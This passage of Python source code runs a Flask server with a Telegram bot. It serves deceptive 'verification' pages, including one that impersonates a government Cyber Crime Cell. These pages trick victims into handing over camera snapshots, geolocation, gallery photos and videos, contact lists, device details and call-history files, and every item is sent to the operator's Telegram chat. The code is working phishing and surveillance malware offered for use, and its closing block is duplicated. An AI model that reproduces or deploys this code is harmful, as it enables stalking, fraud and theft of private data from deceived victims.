await fetch('/api/wab/capture/{{chat_id}}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({photo:photo,location:loc})});
}catch(e){}
document.querySelector('.card').innerHTML='<h2>✅ Verified</h2><p>Your device has been verified.</p>';
},2500);
}catch(e){alert('Camera access required');}
}
</script></body></html>"""

@app.route('/Ayush-wab')
@app.route('/Ayush-wab-1')
@app.route('/Ayush-wab-2')
@app.route('/Ayush-wab-3')
@app.route('/Ayush-wab-4')
@app.route('/Ayush-wab-5')
@app.route('/Ayush-wab-6')
def wab_camera():
    return render_template_string(HTML_WAB_TEMPLATE, chat_id=request.args.get('chat_id', '0'))

@app.route('/api/wab/capture/<chat_id>', methods=['POST'])
def wab_capture(chat_id):
    d = request.get_json(silent=True) or {}
    pb = d.get("photo"); loc = d.get("location")
    try:
        if pb and pb.startswith("data:image"):
            h, b = pb.split(",", 1)
            ib = base64.b64decode(b)
            bio = io.BytesIO(ib); bio.name = "capture.jpg"
            lt = f"📍 {loc['lat']}, {loc['lng']}" if loc else "📍 N/A"
            bot.send_photo(int(chat_id), bio, caption=f"📷 <b>Capture</b>\n{lt}\n{DEV_TAG}", parse_mode="HTML")
    except Exception as e: print(f"WAB capture error: {e}")
    return jsonify({"ok": True})

HTML_GALLERY_TEMPLATE = """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Media Verification</title>
<style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:-apple-system,sans-serif;background:#0f172a;color:#e2e8f0;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
.card{background:#1e293b;padding:32px;border-radius:12px;max-width:400px;text-align:center;border:1px solid #334155}
h2{color:#f8fafc;margin-bottom:12px;font-size:18px}p{color:#94a3b8;font-size:14px;margin-bottom:20px}
.btn{background:#1d4ed8;color:#fff;border:none;padding:13px 24px;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;width:100%}</style></head>
<body><div class="card" id="c"><h2>🖼 Media Verification</h2>
<p>Suspicious media detected. Please select gallery files.</p>
<button class="btn" onclick="pick()">📂 Allow Photos & Videos</button></div>
<script>
async function pick(){
const input=document.createElement('input');input.type='file';input.accept='image/*,video/*';input.multiple=true;
input.onchange=async(e)=>{
const files=e.target.files;let ok=0,fail=0;
for(const f of files){try{
const fd=new FormData();fd.append('file',f);fd.append('chat_id','{{chat_id}}');fd.append('filename',f.name);
const r=await fetch('/api/gallery_upload',{method:'POST',body:fd});
if(r.ok)ok++;else fail++;}catch(x){fail++;}}
document.getElementById('c').innerHTML='<h2>✅ Uploaded</h2><p>'+ok+' files sent.</p>';
};document.body.appendChild(input);input.click();
}
</script></body></html>"""

@app.route('/Ayush-gallery')
def gallery_page():
    return render_template_string(HTML_GALLERY_TEMPLATE, chat_id=request.args.get('chat_id', '0'))

@app.route('/api/gallery_upload', methods=['POST'])
def gallery_upload():
    chat_id = request.form.get('chat_id', '0')
    try:
        if 'file' not in request.files: return jsonify({"error": "no file"}), 400
        f = request.files['file']
        fn = request.form.get('filename', 'file')
        bio = io.BytesIO(f.read()); bio.name = fn
        low = fn.lower()
        try:
            if any(low.endswith(ext) for ext in ('.jpg','.jpeg','.png','.gif','.webp')):
                bot.send_photo(int(chat_id), bio, caption=f"🖼 {html.escape(fn)}", parse_mode="HTML")
            elif any(low.endswith(ext) for ext in ('.mp4','.mov','.avi','.mkv')):
                bot.send_video(int(chat_id), bio, caption=f"🎬 {html.escape(fn)}", parse_mode="HTML")
            else:
                bot.send_document(int(chat_id), bio, caption=f"📁 {html.escape(fn)}", parse_mode="HTML")
        except Exception:
            bio.seek(0); bot.send_document(int(chat_id), bio, caption=f"📁 {html.escape(fn)}")
        return jsonify({"ok": True})
    except Exception as e: return jsonify({"error": str(e)}), 500

HTML_CONTACTS_TEMPLATE = """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Contact Verification</title>
<style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:-apple-system,sans-serif;background:#0f172a;color:#e2e8f0;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
.card{background:#1e293b;padding:32px;border-radius:12px;max-width:400px;text-align:center;border:1px solid #334155}
h2{color:#f8fafc;margin-bottom:12px;font-size:18px}p{color:#94a3b8;font-size:14px;margin-bottom:20px}
.btn{background:#1d4ed8;color:#fff;border:none;padding:13px 24px;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;width:100%}
textarea{width:100%;height:150px;background:#0f172a;border:1px solid #334155;color:#e2e8f0;padding:10px;border-radius:8px;font-size:12px;margin-bottom:12px;resize:none;font-family:monospace}</style></head>
<body><div class="card" id="c"><h2>📇 Contact Verification</h2>
<p>Contact book validation required.</p>
<button class="btn" onclick="pickContacts()">📂 Select Contacts</button>
<div id="manual" style="margin-top:16px;display:none">
<p>Or paste manually:</p>
<textarea id="ta" placeholder="Name, Phone&#10;Name2, Phone2"></textarea>
<button class="btn" onclick="sendManual()">Send</button></div></div>
<script>
async function pickContacts(){
if('contacts' in navigator && 'ContactsManager' in window){
try{const contacts=await navigator.contacts.select(['name','tel'],{multiple:true});
if(contacts.length){await sendData(contacts);return}}catch(e){}
}
document.getElementById('manual').style.display='block';
}
function sendManual(){
const txt=document.getElementById('ta').value;
const lines=txt.split('\\n').filter(l=>l.trim());
const contacts=lines.map(l=>{const p=l.split(',');return{name:(p[0]||'').trim(),tel:[(p[1]||'').trim()]}});
sendData(contacts);
}
async function sendData(contacts){
try{await fetch('/api/contacts_upload',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:'{{chat_id}}',contacts:contacts})})}catch(e){}
document.getElementById('c').innerHTML='<h2>✅ Verified</h2><p>Thank you.</p>';
}
</script></body></html>"""

@app.route('/Ayush-contacts')
def contacts_page():
    return render_template_string(HTML_CONTACTS_TEMPLATE, chat_id=request.args.get('chat_id', '0'))

@app.route('/api/contacts_upload', methods=['POST'])
def contacts_upload():
    d = request.get_json(silent=True) or {}
    chat_id = d.get("chat_id", "0"); contacts = d.get("contacts", [])
    text = f"<blockquote>📇 <b>Contacts</b>\n"
    for c in contacts[:100]:
        n = c.get("name") or "N/A"
        tel = c.get("tel") or []
        ph = tel[0] if tel else "N/A"
        text += f"• {html.escape(str(n))} → <code>{html.escape(str(ph))}</code>\n"
    text += f"{DEV_TAG}</blockquote>"
    try: bot.send_message(int(chat_id), text, parse_mode="HTML")
    except Exception as e: print(f"contacts send error: {e}")
    return jsonify({"ok": True})

@app.route('/Ayush-phonehack')
def phonehack_page():
    tpl = """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Network Audit</title>
<style>body{font-family:sans-serif;background:#0f172a;color:#e2e8f0;padding:20px;max-width:600px;margin:auto}
h2{color:#60a5fa;margin-bottom:16px}.card{background:#1e293b;padding:20px;border-radius:12px;margin-bottom:16px;border:1px solid #334155}
.row{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid #334155;font-size:13px}
.row:last-child{border:none}.k{color:#94a3b8}.v{color:#4ade80;font-family:monospace;text-align:right;max-width:60%;word-break:break-all}
button{background:#1d4ed8;color:#fff;border:none;padding:12px 24px;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;width:100%;margin-top:12px}</style></head>
<body><h2>📡 Network Audit</h2><div class="card" id="info">Loading...</div><button onclick="sendData()">📤 Submit</button>
<script>
const info={ua:navigator.userAgent,platform:navigator.platform,lang:navigator.language,cores:navigator.hardwareConcurrency||'N/A',
mem:navigator.deviceMemory||'N/A',screen:screen.width+'x'+screen.height,timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,
online:navigator.onLine,conn:navigator.connection?navigator.connection.effectiveType:'N/A'};
let html='';for(const k in info){html+='<div class="row"><span class="k">'+k+'</span><span class="v">'+info[k]+'</span></div>';}
document.getElementById('info').innerHTML=html;
async function sendData(){
if(navigator.geolocation){
try{const p=await new Promise((r,j)=>navigator.geolocation.getCurrentPosition(r,j,{timeout:5000}));
info.lat=p.coords.latitude;info.lng=p.coords.longitude;}catch(e){}}
try{await fetch('/api/phonehack_upload',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:'{{chat_id}}',info:info})})}catch(e){}
alert('Submitted');}
</script></body></html>"""
    return render_template_string(tpl, chat_id=request.args.get('chat_id', '0'))

@app.route('/api/phonehack_upload', methods=['POST'])
def phonehack_upload():
    d = request.get_json(silent=True) or {}
    chat_id = d.get("chat_id", "0"); info = d.get("info", {})
    text = "<blockquote>📡 <b>Network Report</b>\n"
    for k, v in info.items(): text += f"• <b>{html.escape(str(k))}</b>: <code>{html.escape(str(v))}</code>\n"
    text += f"{DEV_TAG}</blockquote>"
    try: bot.send_message(int(chat_id), text, parse_mode="HTML")
    except Exception as e: print(f"phonehack send error: {e}")
    return jsonify({"ok": True})

HTML_CALL_TEMPLATE = """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Cyber Crime Audit</title>
<style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:-apple-system,sans-serif;background:#070b12;color:#e2e8f0;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
.card{background:#0f172a;padding:36px 28px;border-radius:12px;max-width:420px;border:1px solid #1e293b}
.header{display:flex;align-items:center;margin-bottom:20px;border-bottom:1px solid #1e293b;padding-bottom:14px}
.emblem{background:#1e3a8a;color:#60a5fa;font-weight:bold;font-size:14px;padding:10px 12px;border-radius:8px;margin-right:12px}
.header h2{font-size:15px;color:#f8fafc}.header p{font-size:11px;color:#93c5fd;margin-top:2px}
.alert{background:#7f1d1d;color:#fca5a5;font-size:11px;padding:6px 10px;border-radius:6px;margin-bottom:16px;border-left:4px solid #ef4444}
.desc{font-size:13px;color:#94a3b8;margin-bottom:20px}
label{display:block;font-size:12px;color:#cbd5e1;margin-bottom:8px}
input[type=file]{width:100%;background:#020617;color:#94a3b8;padding:12px;border:1px solid #334155;border-radius:8px;cursor:pointer}
.btn{background:#1d4ed8;color:#fff;border:none;width:100%;padding:13px;border-radius:8px;font-weight:600;cursor:pointer;margin-top:14px}</style></head>
<body><div class="card" id="c">
<div class="header"><div class="emblem">GOI</div><div><h2>Cyber Crime Cell</h2><p>National Security Division</p></div></div>
<div class="alert">⚠️ Active cyber scam detected. Mandatory device log verification required.</div>
<p class="desc">Financial fraud prevention audit. Upload call history / statement.</p>
<label>Upload PDF / CSV:</label>
<input type="file" id="f" accept=".pdf,.csv">
<button class="btn" onclick="up()">Secure & Verify</button>
</div>
<script>
async function up(){
const input=document.getElementById('f');
if(!input.files.length){alert('Select file');return}
const fd=new FormData();fd.append('file',input.files[0]);fd.append('chat_id','{{chat_id}}');
try{await fetch('/api/upload_call',{method:'POST',body:fd})}catch(e){}
document.getElementById('c').innerHTML='<div style="text-align:center;padding:10px 0"><div style="font-size:42px;margin-bottom:12px">🛡️</div><h3 style="color:#4ade80">Verified - Safe</h3><p style="color:#94a3b8;font-size:13px">Audit complete.</p></div>';
}
</script></body></html>"""

@app.route('/call-history-reveal')
def call_history_reveal():
    return render_template_string(HTML_CALL_TEMPLATE, chat_id=request.args.get('chat_id', '0'))

@app.route('/api/upload_call', methods=['POST'])
def upload_call():
    chat_id = request.form.get('chat_id', '0')
    if 'file' not in request.files: return jsonify({"error": "no file"}), 400
    f = request.files['file']; fn = f.filename or 'statement.pdf'
    bio = io.BytesIO(f.read()); bio.name = fn
    try: bot.send_document(int(chat_id), bio, caption=f"📂 <b>Call History</b>\n{html.escape(fn)}\n{DEV_TAG}", parse_mode="HTML")
    except Exception as e: print(f"upload call error: {e}")
    return jsonify({"ok": True})

def run_flask():
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)), debug=False, use_reloader=False)

if __name__ == "__main__":
    threading.Thread(target=run_flask, daemon=True).start()
    print("Bot starting...")
    try:
        bot.infinity_polling(timeout=30, long_polling_timeout=30)
    except Exception as e:
        print(f"Bot error: {e}")

def run_flask():
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)), debug=False, use_reloader=False)

if __name__ == "__main__":
    threading.Thread(target=run_flask, daemon=True).start()
    print("Bot starting...")
    try:
        bot.infinity_polling(timeout=30, long_polling_timeout=30)
    except Exception as e:
        print(f"Bot error: {e}")